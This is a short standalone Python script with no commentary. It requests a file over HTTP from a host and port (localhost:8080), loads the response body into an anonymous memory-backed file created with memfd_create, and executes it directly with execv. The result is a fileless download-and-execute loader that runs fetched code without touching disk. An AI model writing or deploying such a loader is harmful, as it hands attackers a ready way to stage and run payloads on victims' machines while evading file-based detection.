from ctypes import CDLL
from os import execv
from socket import socket
from sys import argv

PL_SRC = ("localhost", 8080)
PL_PATH = argv[1]
PARMS = argv[2:]

s = socket()
s.connect(PL_SRC)
s.send(f"GET /{PL_PATH} HTTP/1.1\r\n\r\n".encode())

RES = REC = s.recv(1024)
while REC:
    REC = s.recv(1024)
    RES += REC

path = f"/proc/self/fd/{CDLL('libc.so.6').memfd_create('a', 0)}"
with open(path, "wb+") as memfile:
    memfile.write(RES.split(b"\r\n\r\n", 2)[1])

execv(path, [path] + PARMS)
